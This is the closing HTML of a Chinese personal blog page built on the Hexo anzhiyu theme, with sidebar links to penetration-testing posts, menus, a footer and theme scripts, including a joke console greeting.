title="SQL注入-WAF绕过">SQL注入-WAF绕过</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E" title="XXE">XXE</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2023 By <a class="footer-bar-link" href="/" title="ccb" target="_blank">ccb</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 0.88rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.8",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 ccb 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
